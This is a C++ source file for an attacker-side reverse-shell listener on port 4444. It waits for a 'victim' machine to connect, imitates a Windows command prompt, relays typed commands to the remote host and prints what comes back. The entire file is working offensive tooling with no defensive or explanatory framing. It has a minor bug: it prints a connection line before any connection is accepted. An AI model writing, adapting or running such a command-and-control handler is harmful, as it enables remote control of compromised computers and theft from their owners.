#include <iostream>
#include <cstring>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 4444

int main() {
    int server_fd, client_fd;
    struct sockaddr_in address;
    socklen_t addrlen = sizeof(address);

    char buffer[4096];

    // Create socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Bind to PORT
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    // Listen
    if (listen(server_fd, 1) < 0) {
        perror("listen failed");
        exit(EXIT_FAILURE);
    }

    std::cout << "[+] Connection from " << inet_ntoa(address.sin_addr) << "\n";
    std::cout << "Microsoft Windows [Version 10.0.19045.3448]\n";
    std::cout << "Copyright (c) Microsoft Corporation. All rights reserved.\n\n";

    struct sockaddr_in victimAddr;
    socklen_t victimLen = sizeof(victimAddr);

    client_fd = accept(server_fd, (struct sockaddr*)&victimAddr, &victimLen);
    if (client_fd < 0) {
    	perror("accept failed");
    	exit(EXIT_FAILURE);
    }

    char* victim_ip = inet_ntoa(victimAddr.sin_addr);
    int victim_port = ntohs(victimAddr.sin_port);

    std::cout << "[+] Connection from " << victim_ip << ":" << victim_port << "\n";
    std::cout << "Microsoft Windows [Version 10.0.19045.3448]\n";
    std::cout << "Copyright (c) Microsoft Corporation. All rights reserved.\n\n";


    while (true) {
    std::cout << "C:\\Users\\victim1> ";
    std::string command;
    std::getline(std::cin, command);

    if (command == "exit") {
        send(client_fd, command.c_str(), command.length(), 0);
        break;
    }

    send(client_fd, command.c_str(), command.length(), 0);

    // Receive output
    int bytesReceived = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
    if (bytesReceived <= 0) {
        std::cout << "[!] Connection closed by victim\n";
        break;
    }

    buffer[bytesReceived] = '\0';
    std::cout << buffer << std::endl;
}


    close(client_fd);
    close(server_fd);
    return 0;
}
